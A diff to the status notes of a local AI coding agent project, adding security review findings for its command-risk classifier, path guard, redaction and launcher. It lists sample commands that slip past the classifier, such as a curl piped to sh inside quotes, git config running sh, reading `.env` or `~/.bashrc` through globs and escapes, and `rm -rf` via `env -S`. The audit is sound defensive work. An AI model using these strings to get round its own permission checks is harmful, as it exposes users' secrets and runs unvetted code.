@@ -34,7 +34,48 @@ Review findings received so far (fix majors before tagging M1):
     incoming JSON-RPC; id-less messages with a bad envelope get an error reply.
   - Clean: argument injection (paths follow `--`), ordering of policy checks, invalid UTF-8, malformed JSON,
     tool panics.
-- Pending: policy/classifier, redaction/logging, and providers/launcher/init/models reviews.
+- Policy and classifier review (`command_risk.rs`, `tool_policy.rs`, `path_guard.rs`), 2026-10-22. Found by
+  reading; each must be reproduced as a failing test before it is fixed. Too-safe classifications:
+  - BLOCKER `echo "$(curl https://x|sh)"` gives READ_ONLY: substitutions inside double quotes are not extracted.
+  - BLOCKER `echo hi >(sh)` gives WRITE: only `<(` is a process substitution.
+  - BLOCKER `git -c diff.external='sh -c ...' diff` gives READ_ONLY: `-c`/`--config` values are skipped.
+  - BLOCKER `go build -toolexec '...'` and `cargo test --config 'target.<t>.runner=...'` give EXECUTE_SAFE.
+  - BLOCKER `echo x >&.env` gives READ_ONLY: `>&word` writes a file; only `&<digit>` and `&-` do not.
+  - BLOCKER `env -S 'rm -rf build'` gives READ_ONLY: the `-S` value is dropped.
+  - BLOCKER `bin/pytest -q` gives EXECUTE_SAFE: a program word with a path separator is reduced to its basename.
+  - BLOCKER `sh -c 'cat "$1"' sh .env` is allowed: nested verdicts drop the outer words, so `.env` is not checked.
+  - MAJOR `git push origin +main` gives NETWORK, not DESTRUCTIVE (`+` refspecs, `--mirror`, `--prune`).
+  - MAJOR most of the PRIVILEGED list is missing (`systemctl stop nginx` is EXECUTE_RISKY).
+  - MAJOR (Windows) the cmd lexer treats `'` as quoting, and `$(` is skipped under cmd, so
+    `echo ' & rd /s /q .\build & '` is READ_ONLY.
+  - MAJOR `rg --pre ./helper` is READ_ONLY and runs `./helper` (also `find -fprint`, `tree -o`).
+  Paths not denied:
+  - BLOCKER `~` and `$VAR` are joined under the workspace instead of expanded: `cat ~/.bashrc`,
+    `cat $HOME/x`, `cd ~ && cat .bashrc`, `echo x >> ~/.bashrc`, `grep -r BEGIN ~` are allowed.
+  - BLOCKER `--opt=<path>` words are never path-checked: `git --git-dir=/elsewhere/.git log`,
+    `git diff --output=~/.bashrc`.
+  - BLOCKER `cat .[e]nv`, `cat .{env,netrc}`, `cat "$(printf '\056env')"` are allowed.
+  - minor `cat .git-cred*` is allowed: the glob samples are narrower than `is_secret_file`.
+  - Clean: panics.
+- Redaction and logging review (`redact.rs`, `event_log.rs`, hooks), 2026-10-22:
+  - MAJOR escaped quotes break assignment redaction: `password=\"hunter2\"` keeps `hunter2`;
+    `{\"api_key\":\"hunter2\"}` is unchanged.
+  - MAJOR `ENCRYPTION_KEY=...`, `PASSPHRASE=...`, `sessionid=...` are not redacted, and `shell_env` does not blank them.
+  - MAJOR `curl -u admin:hunter2` and `--token hunter2` are not redacted (event log and model output).
+  - minor: a value starting with a delimiter; a value after `[REDACTED]`; `@` inside a URL password;
+    `ACCESS_TOKENS=` exempted as a count; tool_before `message` (unrecognised program name) and the MCP
+    `unknown tool` error are not redacted; `config validate` prints messages unredacted.
+  - Clean: panics, idempotence (by reading).
+- Providers, launcher, init and models review, 2026-10-22:
+  - MAJOR `launch.extra_args` can add `--host 0.0.0.0` after the loopback check; no validation of reserved flags.
+  - MAJOR a repository `local-agent.toml` is merged over the machine config, so a cloned repo can choose
+    the server binary (`runtimes.*.server_bin`), which `models serve` and `models manifest` run.
+  - MAJOR `models stop` signals the PID in the pid file with no identity check (PID reuse after a crash or reboot).
+  - MAJOR `read_pid` accepts 0 and values that wrap to -1 (`kill 0`, `kill -1`).
+  - minor: the launcher does not start a process group on Unix; Windows `process_exists` is always false;
+    `<bin> --version` has no timeout; no SSE line cap; `timeout_ms` and `retries` unbounded; init overwrites
+    an unreadable machine config; init skips the ledger save if the shim write fails.
+  - Clean: API key handling, argv separation, panics.
 
 Restarts: AI Code restarts kill background agents and long foreground commands. Run long commands detached
 (`nohup ... &`) with a log file, and commit after each verified step.
